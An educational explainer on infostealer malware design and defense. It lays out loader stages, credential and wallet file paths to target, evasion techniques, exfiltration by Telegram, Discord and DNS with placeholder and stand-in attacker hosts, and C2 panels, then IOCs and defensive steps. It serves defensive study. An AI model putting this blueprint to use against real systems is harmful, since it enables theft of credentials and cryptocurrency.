# Infostealer Malware: Architecture & Technical Design

> **Disclaimer:** This document is for **educational and defensive research purposes only**. Understanding how malware operates is essential for building effective defenses, detection systems, and security awareness.

---

## Table of Contents

1. [Overview](#overview)
2. [Business Model](#business-model)
3. [High-Level Architecture](#high-level-architecture)
4. [Component Breakdown](#component-breakdown)
5. [Execution Flow](#execution-flow)
6. [Target Data Sources](#target-data-sources)
7. [Exfiltration Methods](#exfiltration-methods)
8. [Evasion Techniques](#evasion-techniques)
9. [Command & Control Infrastructure](#command--control-infrastructure)
10. [Detection & Defense](#detection--defense)

---

## Overview

**Infostealers** are a class of malware designed to silently harvest sensitive data from infected systems. Unlike ransomware (which encrypts and demands payment), infostealers operate covertly to steal:

- Cryptocurrency wallet files and private keys
- Browser credentials and session cookies
- Two-factor authentication tokens
- Personal identifiable information (PII)
- Financial data and credit card information

### Key Characteristics

| Characteristic | Description |
|----------------|-------------|
| **Stealth** | Operates silently, often fileless |
| **Speed** | Completes exfiltration in 2-10 minutes |
| **Broad targeting** | 200+ applications and browsers |
| **Modular** | Plugins for specific data sources |
| **Evasion-ready** | Anti-VM, anti-debugging, anti-sandbox |

---

## Business Model

Infostealers operate as **Malware-as-a-Service (MaaS)**:

```
┌─────────────────────────────────────────────────────────────┐
│              INFOSTEALER ECONOMY                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐                                           │
│  │  Developer   │── Builds & maintains malware             │
│  │  (Coder)     │── Revenue: ~$1M+/year                    │
│  └──────┬───────┘                                           │
│         │ Sells licenses ($50-500/month)                   │
│         ↓                                                   │
│  ┌──────────────┐                                           │
│  │  Affiliate   │── Distributes malware                    │
│  │  (Distributor)│── Revenue: 70% commission               │
│  └──────┬───────┘                                           │
│         │ Via: cracked sites, spam, ads                    │
│         ↓                                                   │
│  ┌──────────────┐                                           │
│  │   Victim     │── Infected system                        │
│  │   (Target)   │── Data harvested                         │
│  └──────┬───────┘                                           │
│         │ Logs uploaded to panel                           │
│         ↓                                                   │
│  ┌──────────────┐                                           │
│  │   Buyer      │── Purchases logs ($5-50/victim)         │
│  │  (Cashier)   │── Drains wallets, sells data             │
│  └──────────────┘                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Popular Infostealer Families (2023-2024)

| Name | Price | Estimated Infections | Notable Features |
|------|-------|---------------------|------------------|
| RedLine Stealer | ~$150/month | 500,000+ | Most popular, frequent updates |
| Atomic Stealer | ~$300/month | 200,000+ | 200+ wallet targets |
| Lumma Stealer | ~$100/month | 150,000+ | Lightweight, fast |
| Raccoon Stealer | ~$75/week | 100,000+ | Browser-focused |
| Vidar | ~$120/month | 80,000+ | 2FA targeting |

---

## High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    INFOSTEALER ARCHITECTURE                      │
└─────────────────────────────────────────────────────────────────┘

                              ┌─────────────┐
                              │   VICTIM    │
                              │   SYSTEM    │
                              └──────┬──────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1: DROPPER/LOADER                                        │
│  ─────────────────────                                          │
│  • Disguised as legitimate software                             │
│  • Bypasses AV via obfuscation/packing                          │
│  • Performs environment checks (VM, sandbox, debugger)          │
│  • Decrypts and loads main payload                              │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 2: CORE STEALER MODULE                                   │
│  ────────────────────────                                       │
│  • Fileless execution (in-memory)                               │
│  • Scans system for target applications                         │
│  • Extracts data from wallets, browsers, apps                   │
│  • Captures screenshots, clipboard, keylogs                     │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 3: DATA AGGREGATION                                      │
│  ───────────────────────                                        │
│  • Collects all harvested data to temp folder                   │
│  • Compresses into archive (ZIP/RAR)                            │
│  • Encrypts archive (AES/XOR)                                   │
│  • Prepares for exfiltration                                    │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 4: EXFILTRATION                                          │
│  ───────────────────                                            │
│  • Sends to C2 server via HTTPS/DNS/Telegram                    │
│  • Uses domain generation algorithms (DGA)                      │
│  • Employs fast-flux DNS for resilience                         │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 5: CLEANUP                                               │
│  ─────────────                                                  │
│  • Deletes temporary files                                      │
│  • Clears event logs (if privileges allow)                      │
│  • Self-destructs or establishes persistence                    │
└─────────────────────────────────────────────────────────────────┘
                               │
                               ▼
                        ┌─────────────┐
                        │  ATTACKER   │
                        │  C2 PANEL   │
                        └─────────────┘
```

---

## Component Breakdown

### 1. Dropper/Loader Component

**Purpose:** Initial execution and payload delivery

```
┌─────────────────────────────────────────────────────────────┐
│                    DROPPER COMPONENT                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Input: Infected file (.exe, .msi, document with macro)    │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 1. ANTI-ANALYSIS CHECKS                              │   │
│  │    • Is running in VM? (VirtualBox, VMware artifacts)│   │
│  │    • Is debugger attached? (IsDebuggerPresent)       │   │
│  │    • Sandbox detection (Cuckoo, Joe Sandbox)         │   │
│  │    • User interaction check (mouse movements)        │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                  │
│                          ▼                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 2. DECRYPT PAYLOAD                                   │   │
│  │    • Main stealer is encrypted within dropper        │   │
│  │    • Uses XOR/AES/RC4 with embedded key              │   │
│  │    • Payload extracted to memory (fileless)          │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                  │
│                          ▼                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 3. INJECT & EXECUTE                                  │   │
│  │    • Process hollowing (inject into svchost.exe)     │   │
│  │    • DLL side-loading                                │   │
│  │    • Reflective DLL injection                        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Output: Main stealer running in memory                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2. Core Stealer Module

**Purpose:** Data extraction from target applications

```
┌─────────────────────────────────────────────────────────────┐
│                   CORE STEALER MODULE                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌──────────────┐│
│  │  WALLET MODULE  │  │ BROWSER MODULE  │  │ SYSTEM MODULE││
│  ├─────────────────┤  ├─────────────────┤  ├──────────────┤│
│  │ • MetaMask      │  │ • Chrome        │  │ • WiFi       ││
│  │ • Exodus        │  │ • Firefox       │  │   passwords  ││
│  │ • Electrum      │  │ • Edge          │  │ • System     ││
│  │ • Trust Wallet  │  │ • Brave         │  │   info       ││
│  │ • Bitcoin Core  │  │ • Opera         │  │ • Hardware   ││
│  │ • Atomic        │  │ • Passwords     │  │   fingerprint││
│  │ • Armory        │  │ • Cookies       │  │              ││
│  │ • +200 more     │  │ • History       │  │              ││
│  │                 │  │ • Autofill      │  │              ││
│  └─────────────────┘  └─────────────────┘  └──────────────┘│
│                                                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌──────────────┐│
│  │  CAPTURE MODULE │  │  COMM MODULE    │  │  PERSISTENCE ││
│  ├─────────────────┤  ├─────────────────┤  ├──────────────┤│
│  │ • Screenshots   │  │ • C2 comms      │  │ • Registry   ││
│  │ • Keylogger     │  │ • Exfiltration  │  │   keys       ││
│  │ • Clipboard     │  │ • Encryption    │  │ • Scheduled  ││
│  │   monitoring    │  │ • Compression   │  │   tasks      ││
│  │ • Webcam        │  │                 │  │ • Startup    ││
│  │   capture       │  │                 │  │   folder     ││
│  └─────────────────┘  └─────────────────┘  └──────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3. Data Aggregation Component

**Purpose:** Collect and package stolen data

```
┌─────────────────────────────────────────────────────────────┐
│                  DATA AGGREGATION FLOW                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Harvested Data          Temp Collection                   │
│  ─────────────           ───────────────                    │
│                                                             │
│  Wallet files     ────→  %TEMP%\[random]\wallets\          │
│  Browser data     ────→  %TEMP%\[random]\browsers\         │
│  Screenshots      ────→  %TEMP%\[random]\screens\          │
│  Keylogs          ────→  %TEMP%\[random]\keylogs\          │
│  System info      ────→  %TEMP%\[random]\system\           │
│                                                             │
│                          │                                  │
│                          ▼                                  │
│                   Compress (ZIP)                            │
│                   Encrypt (AES-256)                         │
│                   Name: [HWID]_[DATE].zip                   │
│                                                             │
│                          │                                  │
│                          ▼                                  │
│                   Ready for exfiltration                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Execution Flow

### Detailed Step-by-Step Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     EXECUTION TIMELINE                          │
└─────────────────────────────────────────────────────────────────┘

T+0s    User runs infected file
        │
        ▼
T+1s    Dropper executes
        ├─ Check VM/sandbox/debugger
        ├─ Verify minimum user activity
        └─ Decrypt main payload
        │
        ▼
T+3s    Core stealer injected (fileless)
        ├─ Runs in memory (no disk footprint)
        └─ Spawns worker threads
        │
        ▼
T+5s    System reconnaissance
        ├─ Enumerate installed applications
        ├─ Identify running processes
        ├─ Map user profile directories
        └─ Collect hardware fingerprint
        │
        ▼
T+10s   Parallel data extraction begins
        ├─ Thread 1: Wallet files
        ├─ Thread 2: Browser data
        ├─ Thread 3: System credentials
        ├─ Thread 4: Screenshots/clipboard
        └─ Thread 5: Keylogger (continuous)
        │
        ▼
T+60s   Data aggregation
        ├─ Copy all data to temp folder
        ├─ Generate system fingerprint (HWID)
        └─ Create archive: [HWID]_logs.zip
        │
        ▼
T+90s   Exfiltration
        ├─ Encrypt archive
        ├─ Connect to C2 server
        ├─ Upload via HTTPS POST
        └─ Verify upload success
        │
        ▼
T+120s  Cleanup
        ├─ Delete temp files
        ├─ Clear event logs (if admin)
        ├─ Optional: Establish persistence
        └─ Exit or sleep for next round
        │
        ▼
T+END   Attacker receives logs in panel


TOTAL EXECUTION TIME: ~2 minutes
```

---

## Target Data Sources

### Cryptocurrency Wallets

```
┌─────────────────────────────────────────────────────────────┐
│              CRYPTO WALLET TARGETS                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BROWSER EXTENSIONS                                         │
│  ─────────────────                                          │
│  MetaMask:                                                  │
│  %APPDATA%\Chrome\User Data\Default\Extensions\nkbihfbe... │
│  → Local Storage\leveldb\*.ldb (encrypted vault)           │
│                                                             │
│  Phantom:                                                   │
│  %APPDATA%\Chrome\User Data\Default\Extensions\bfnaelm...  │
│  → Local Storage\leveldb\*.ldb                             │
│                                                             │
│  Trust Wallet:                                              │
│  %APPDATA%\Chrome\User Data\Default\Extensions\egjidjb...  │
│  → Local Storage\leveldb\*.ldb                             │
│                                                             │
│  DESKTOP WALLETS                                            │
│  ───────────────                                            │
│  Exodus:                                                    │
│  %APPDATA%\Exodus\exodus.wallet\                           │
│  → *.exodus (encrypted wallet files)                       │
│                                                             │
│  Electrum:                                                  │
│  %APPDATA%\Electrum\wallets\                               │
│  → * (wallet files, often encrypted)                       │
│                                                             │
│  Bitcoin Core:                                              │
│  %APPDATA%\Bitcoin\                                        │
│  → wallet.dat (encrypted private keys)                     │
│                                                             │
│  Atomic Wallet:                                             │
│  %APPDATA%\atomic\Local Storage\leveldb\                   │
│  → *.ldb                                                   │
│                                                             │
│  Armory:                                                    │
│  %APPDATA%\Armory\                                         │
│  → *.wallet                                                │
│                                                             │
│  +200 more wallet targets                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Browser Data

```
┌─────────────────────────────────────────────────────────────┐
│                  BROWSER DATA TARGETS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CHROMIUM-BASED (Chrome, Edge, Brave, Opera)               │
│  ─────────────────────────────────────────                  │
│  Location: %LOCALAPPDATA%\[Browser]\User Data\Default\     │
│                                                             │
│  Files Targeted:                                            │
│  ├─ Login Data         → Saved passwords (SQLite)          │
│  ├─ Cookies            → Session cookies (SQLite)          │
│  ├─ Web Data           → Autofill data (SQLite)            │
│  ├─ History            → Browsing history (SQLite)         │
│  ├─ Bookmarks          → Saved bookmarks (JSON)            │
│  └─ Local Storage\leveldb\ → Extension data               │
│                                                             │
│  Password Decryption:                                       │
│  • Windows: DPAPI (CryptUnprotectData)                     │
│  • Requires: User login session                            │
│  • Master Key: %LOCALAPPDATA%\[Browser]\User Data\         │
│                Local State (AES key)                       │
│                                                             │
│  FIREFOX                                                    │
│  ───────                                                    │
│  Location: %APPDATA%\Mozilla\Firefox\Profiles\[profile]\   │
│                                                             │
│  Files Targeted:                                            │
│  ├─ logins.json        → Saved passwords                   │
│  ├─ key4.db            → Password encryption key           │
│  ├─ cookies.sqlite     → Session cookies                   │
│  ├─ formhistory.sqlite → Form autofill data                │
│  └─ places.sqlite      → Bookmarks & history               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### System Information

```
┌─────────────────────────────────────────────────────────────┐
│                 SYSTEM INFORMATION COLLECTED                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  HARDWARE FINGERPRINT (HWID)                                │
│  ───────────────────────────                                │
│  • CPU ID                                                   │
│  • Motherboard serial                                       │
│  • MAC addresses                                            │
│  • Disk volume serial                                       │
│  • GPU information                                          │
│  • RAM amount                                               │
│  • Screen resolution                                        │
│                                                             │
│  OPERATING SYSTEM                                           │
│  ──────────────────                                         │
│  • Windows version & build                                  │
│  • System language                                          │
│  • Timezone                                                 │
│  • Uptime                                                   │
│  • Admin privileges status                                  │
│  • Installed security software                              │
│                                                             │
│  USER INFORMATION                                           │
│  ────────────────                                           │
│  • Username & hostname                                      │
│  • IP address (external via API)                            │
│  • Geolocation (IP-based)                                   │
│  • ISP information                                          │
│                                                             │
│  NETWORK INFORMATION                                        │
│  ─────────────────────                                      │
│  • WiFi networks & saved passwords                          │
│  • Network interfaces                                       │
│  • Open ports                                               │
│  • Active connections                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Exfiltration Methods

### Method 1: HTTPS POST (Most Common)

```
┌─────────────────────────────────────────────────────────────┐
│                    HTTPS EXFILTRATION                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Victim System                          C2 Server           │
│       │                                     │               │
│       │  1. Resolve C2 domain               │               │
│       │────────────────────────────────────>│               │
│       │                                     │               │
│       │  2. TLS handshake                   │               │
│       │<───────────────────────────────────>│               │
│       │                                     │               │
│       │  3. POST /api/upload                │               │
│       │     Content-Type: multipart/form    │               │
│       │     Body: [encrypted archive]       │               │
│       │     Headers:                        │               │
│       │       X-HWID: [fingerprint]         │               │
│       │       X-Campaign: [affiliate_id]    │               │
│       │────────────────────────────────────>│               │
│       │                                     │               │
│       │  4. HTTP 200 OK                     │               │
│       │     { "status": "received" }        │               │
│       │<────────────────────────────────────│               │
│       │                                     │               │
│       │  5. Self-destruct                   │               │
│       │                                     │               │
│                                                             │
│  Advantages:                                                │
│  • Blends with normal traffic                               │
│  • Encrypted via TLS                                        │
│  • Hard to block without breaking web                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Method 2: Telegram Bot API

```
┌─────────────────────────────────────────────────────────────┐
│                   TELEGRAM EXFILTRATION                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Stealer Code:                                              │
│  ─────────────                                              │
│  BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"       │
│  CHAT_ID = "-1001234567890"                                │
│                                                             │
│  POST https://api.telegram.org/bot[BOT_TOKEN]/sendDocument│
│                                                             │
│  Parameters:                                                │
│  • chat_id: Attacker's Telegram chat/group                 │
│  • document: Encrypted log archive                         │
│  • caption: HWID, country, OS info                         │
│                                                             │
│  Advantages:                                                │
│  • No C2 server needed                                      │
│  • Telegram infrastructure hides traffic                   │
│  • Free, reliable, hard to block                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Method 3: Discord Webhook

```
┌─────────────────────────────────────────────────────────────┐
│                   DISCORD EXFILTRATION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Webhook URL:                                               │
│  https://discord.com/api/webhooks/[ID]/[TOKEN]             │
│                                                             │
│  POST Request:                                              │
│  {                                                          │
│    "username": "Infostealer",                               │
│    "avatar_url": "...",                                     │
│    "content": "New victim: [HWID] - [Country]",             │
│    "file": [encrypted archive]                              │
│  }                                                          │
│                                                             │
│  Advantages:                                                │
│  • Free infrastructure                                      │
│  • Blends with legitimate Discord traffic                  │
│  • Real-time notifications to attacker                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Method 4: DNS Tunneling

```
┌─────────────────────────────────────────────────────────────┐
│                     DNS EXFILTRATION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Data encoded in DNS queries:                               │
│                                                             │
│  [base64_chunk].sub1.sub2.evil-domain[.]com                │
│                                                             │
│  Example:                                                   │
│  U2FsdGVkX21hbHdhcmVfZGF0YQ.data.evil-domain[.]com         │
│                                                             │
│  Process:                                                   │
│  1. Split encrypted data into chunks                        │
│  2. Encode each chunk as subdomain                          │
│  3. Send DNS query for each subdomain                       │
│  4. Attacker's DNS server logs all queries                  │
│  5. Reconstruct data from query logs                        │
│                                                             │
│  Advantages:                                                │
│  • DNS rarely blocked                                       │
│  • Works behind most firewalls                              │
│  • Low bandwidth but very stealthy                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Evasion Techniques

### Anti-Analysis Checks

```
┌─────────────────────────────────────────────────────────────┐
│                    EVASION TECHNIQUES                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ANTI-VM DETECTION                                          │
│  ───────────────────                                        │
│  Check for:                                                 │
│  • VirtualBox drivers (VBoxMouse, VBoxGuest)               │
│  • VMware tools (vmtoolsd.exe)                             │
│  • Hyper-V indicators                                     │
│  • VM-specific MAC address prefixes                        │
│  • VM-specific hardware IDs                               │
│  • Low RAM count (<2GB suspicious)                         │
│  • Single CPU core (suspicious)                            │
│                                                             │
│  If VM detected → Exit silently (no infection)             │
│                                                             │
│  ANTI-DEBUGGING                                             │
│  ────────────────                                           │
│  • IsDebuggerPresent() API                                  │
│  • CheckRemoteDebuggerPresent()                            │
│  • OutputDebugString() + exception handling                │
│  • Timing checks (debugging slows execution)               │
│  • Breakpoint detection (INT 3 instructions)               │
│                                                             │
│  If debugger detected → Exit or fake benign behavior       │
│                                                             │
│  ANTI-SANDBOX                                               │
│  ───────────────                                            │
│  • Check for sandbox processes (Cuckoo, Joe Sandbox)       │
│  • Verify user interaction (mouse clicks, keyboard)        │
│  • Check uptime (<5 min = suspicious)                      │
│  • Count installed applications (few = suspicious)         │
│  • Check network activity patterns                         │
│                                                             │
│  CODE OBFUSCATION                                           │
│  ──────────────────                                         │
│  • String encryption (XOR, Base64, custom algorithms)      │
│  • Control flow obfuscation                                │
│  • Dead code insertion                                     │
│  • API hashing (resolve APIs by hash, not name)            │
│  • Packed executables (UPX, custom packers)                │
│                                                             │
│  FILELESS EXECUTION                                         │
│  ──────────────────                                         │
│  • Load payload directly into memory                       │
│  • Process hollowing (replace legitimate process code)     │
│  • Reflective DLL injection                                │
│  • PowerShell scriptless execution                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Command & Control Infrastructure

### C2 Panel Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER C2 PANEL                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Web Dashboard (PHP/Node.js/Python)                        │
│  ─────────────────────────────────                          │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  INFOSTEALER C2 PANEL v2.4                          │   │
│  ├─────────────────────────────────────────────────────┤   │
│  │                                                     │   │
│  │  Dashboard                                          │   │
│  │  ┌─────────────────────────────────────────────┐   │   │
│  │  │ Total Logs: 15,847     │ Today: 234        │   │   │
│  │  │ Active Bots: 1,203     │ Countries: 89     │   │   │
│  │  └─────────────────────────────────────────────┘   │   │
│  │                                                     │   │
│  │  Filter Logs                                        │   │
│  │  [Country ▼] [Wallet Type ▼] [Date Range ▼]       │   │
│  │                                                     │   │
│  │  Recent Victims                                     │   │
│  │  ┌───────────────────────────────────────────────┐ │   │
│  │  │ ID    │ Country │ Wallet       │ Est. Value  │ │   │
│  │  │ 15847 │ US      │ MetaMask     │ $4,200      │ │   │
│  │  │ 15846 │ DE      │ Exodus       │ $890        │ │   │
│  │  │ 15845 │ BR      │ Trust Wallet │ $15,000     │ │   │
│  │  │ 15844 │ IN      │ Electrum     │ $2,100      │ │   │
│  │  └───────────────────────────────────────────────┘ │   │
│  │                                                     │   │
│  │  [Download Selected] [Sell Logs] [Export CSV]      │   │
│  │                                                     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Backend Components:                                        │
│  ──────────────────                                         │
│  • Database (MySQL/PostgreSQL/MongoDB)                     │
│  • File storage (S3-compatible for logs)                   │
│  • API for stealer communication                           │
│  • Affiliate tracking system                               │
│  • Automated log parsing & categorization                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### C2 Server Infrastructure

```
┌─────────────────────────────────────────────────────────────┐
│                  C2 INFRASTRUCTURE                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Domain Strategy:                                           │
│  ─────────────────                                          │
│  • Multiple domains (redundancy)                            │
│  • Domain Generation Algorithms (DGA)                       │
│  • Fast-flux DNS (rapidly changing IPs)                     │
│  • Bulletproof hosting (Russia, Netherlands, etc.)          │
│  • Compromised legitimate servers                           │
│                                                             │
│  Traffic Flow:                                              │
│  ─────────────                                              │
│  Victim → CDN/Proxy → Redirector → C2 Server               │
│                                                             │
│  • CDNs hide real C2 IP                                    │
│  • Redirectors add layers                                  │
│  • Traffic encrypted end-to-end                            │
│                                                             │
│  Resilience:                                                │
│  ─────────                                                  │
│  • Multiple backup domains                                 │
│  • Automatic failover                                      │
│  • Geo-distributed servers                                 │
│  • Dead man's switch (auto-publish if taken down)          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Detection & Defense

### Indicators of Compromise (IOCs)

```
┌─────────────────────────────────────────────────────────────┐
│                    DETECTION SIGNALS                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  NETWORK INDICATORS                                         │
│  ──────────────────                                         │
│  • Connections to known C2 domains/IPs                     │
│  • Unusual HTTPS POST to unknown domains                   │
│  • DNS queries with encoded subdomains                     │
│  • Telegram/Discord API calls from unknown processes       │
│  • High outbound data volume in short time                 │
│                                                             │
│  FILE SYSTEM INDICATORS                                     │
│  ──────────────────────                                     │
│  • New files in %TEMP% with random names                   │
│  • Access patterns to wallet directories                   │
│  • ZIP/archive creation in temp folders                    │
│  • Modified timestamps on wallet files                     │
│                                                             │
│  PROCESS INDICATORS                                         │
│  ──────────────────                                         │
│  • Suspicious parent-child process relationships           │
│  • Process injection into svchost.exe, explorer.exe        │
│  • PowerShell with encoded commands                        │
│  • Unsigned executables in user directories                │
│                                                             │
│  REGISTRY INDICATORS                                        │
│  ───────────────────                                        │
│  • New Run/RunOnce keys                                    │
│  • Modified file associations                              │
│  • New browser extension installations                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Defense Strategy

```
┌─────────────────────────────────────────────────────────────┐
│                    DEFENSE IN DEPTH                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PREVENTION (Before Infection)                              │
│  ─────────────────────────────                              │
│  ✓ Download software only from official sources            │
│  ✓ Verify URLs (typosquating protection)                   │
│  ✓ Use hardware wallets (keys never on PC)                 │
│  ✓ Keep OS and antivirus updated                           │
│  ✓ Use standard user account (not admin)                   │
│  ✓ Enable Controlled Folder Access (Windows)               │
│  ✓ Browser extension whitelisting                          │
│  ✓ User security awareness training                        │
│                                                             │
│  DETECTION (During Infection)                               │
│  ─────────────────────────────                              │
│  ✓ Endpoint Detection & Response (EDR)                     │
│  ✓ Network traffic monitoring                              │
│  ✓ Behavioral analysis (not just signatures)               │
│  ✓ Process monitoring                                      │
│  ✓ File integrity monitoring                               │
│  ✓ DNS query logging                                       │
│                                                             │
│  RESPONSE (After Detection)                                 │
│  ─────────────────────────────                              │
│  ✓ Isolate infected system immediately                     │
│  ✓ Assume all software wallet keys compromised             │
│  ✓ Transfer funds to new wallets (new seed phrases)        │
│  ✓ Revoke browser extension permissions                    │
│  ✓ Change all passwords                                    │
│  ✓ Full system rebuild (don't just clean)                  │
│  ✓ Report to authorities                                   │
│                                                             │
│  HARDENING (Long-term)                                      │
│  ─────────────                                              │
│  ✓ Dedicated machine for crypto operations                 │
│  ✓ Hardware wallets for significant amounts                │
│  ✓ Multi-signature wallets                                 │
│  ✓ Air-gapped cold storage                                 │
│  ✓ Regular security audits                                 │
│  ✓ Incident response plan                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Security Tools

| Category | Tools |
|----------|-------|
| **Antivirus** | Windows Defender, Bitdefender, Kaspersky |
| **Anti-malware** | Malwarebytes, HitmanPro |
| **EDR** | CrowdStrike, SentinelOne, Microsoft Defender for Endpoint |
| **Network** | Wireshark, Zeek, Suricata |
| **Sandbox** | Any.Run, Hybrid Analysis, Joe Sandbox |
| **IOC Scanning** | YARA, Loki, GRR |

---

## Appendix: Common File Paths Targeted

### Windows

```
# MetaMask
%APPDATA%\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgmnn\

# Exodus
%APPDATA%\Exodus\exodus.wallet\

# Electrum
%APPDATA%\Electrum\wallets\

# Bitcoin Core
%APPDATA%\Bitcoin\wallet.dat

# Trust Wallet Extension
%APPDATA%\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbddppkfpb\

# Chrome Passwords
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox Passwords
%APPDATA%\Mozilla\Firefox\Profiles\[profile]\logins.json
```

### macOS

```
# MetaMask
~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn/

# Exodus
~/Library/Application Support/Exodus/

# Electrum
~/.electrum/wallets/

# Bitcoin Core
~/Library/Application Support/Bitcoin/wallet.dat
```

### Linux

```
# MetaMask
~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn/

# Electrum
~/.electrum/wallets/

# Bitcoin Core
~/.bitcoin/wallet.dat
```

---

## References & Further Reading

- CISA Malware Analysis Reports
- MITRE ATT&CK Framework - Infostealer Techniques
- VirusTotal Intelligence
- Any.Run Interactive Sandbox
- RedLine Stealer Technical Analysis (various security vendors)
- Atomic Stealer Reverse Engineering Reports

---

**Document Version:** 1.0  
**Last Updated:** 2026  
**Purpose:** Educational/Defensive Research

> ⚠️ **Remember:** This information should only be used for defensive purposes—building better security systems, educating users, and protecting against malware. Never use this knowledge to create, distribute, or improve malware.